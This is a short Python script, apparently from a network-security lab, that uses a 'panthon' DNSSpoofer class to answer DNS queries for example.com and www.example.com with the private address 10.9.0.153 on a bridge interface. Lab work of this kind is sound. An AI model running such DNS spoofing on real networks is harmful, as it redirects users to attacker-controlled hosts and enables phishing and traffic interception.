from panthon import DNSSpoofer

spoofing_rules = {
    "www.example.com.": "10.9.0.153",
    "example.com.": "10.9.0.153" 
}

spoofer = DNSSpoofer('br-6e22e6f96755', spoofing_rules)  # Adjust interface as needed
spoofer.start()